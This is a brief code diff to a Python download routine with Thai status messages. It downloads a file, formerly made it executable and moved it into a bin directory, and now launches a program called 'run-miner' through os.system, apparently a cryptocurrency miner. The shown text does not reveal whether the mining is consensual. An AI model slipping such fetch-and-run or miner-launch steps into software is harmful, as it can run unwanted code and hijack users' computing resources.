@@ -10,9 +10,11 @@ def download_file(url, save_path):
         with open(save_path, 'wb') as file:
             for chunk in response.iter_content(chunk_size=8192):
                 file.write(chunk)
+
+        
         print("\033[93mเชื่อมต่อสำเร็จแล้ว\033[0m")
-        os.system ("chmod +x start && mv start ../../bin")
-        os.system ("python3 connect.py")
+        #os.system ("chmod +x start && mv start ../../bin")
+        os.system ("run-miner")
     except requests.exceptions.RequestException as e:
         print ("\033[95mไม่พบการเชื่อมต่อ ตรวจสอบอีกครั้งใน 10 วินาที\033[0m")
         time.sleep(10)
